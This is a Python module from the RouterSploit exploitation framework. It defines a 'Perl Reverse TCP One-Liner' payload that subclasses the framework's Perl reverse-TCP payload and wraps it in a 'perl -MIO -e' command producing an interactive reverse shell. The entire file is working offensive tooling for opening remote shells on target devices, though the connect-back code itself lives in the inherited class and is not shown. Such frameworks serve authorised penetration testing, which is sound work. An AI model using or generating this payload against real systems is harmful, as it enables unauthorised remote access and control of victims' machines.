from routersploit.core.exploit import *
from routersploit.modules.payloads.perl.reverse_tcp import Exploit as PerlReverseTCP


class Exploit(PerlReverseTCP):
    __info__ = {
        "name": "Perl Reverse TCP One-Liner",
        "description": "Creates interactive tcp reverse shell by using perl one-liner.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>"  # routersploit module
        ),
    }

    cmd = OptString("perl", "Perl binary")

    def generate(self):
        payload = super(Exploit, self).generate()

        cmd = "{} -MIO -e '{}'".format(self.cmd, payload)
        return cmd
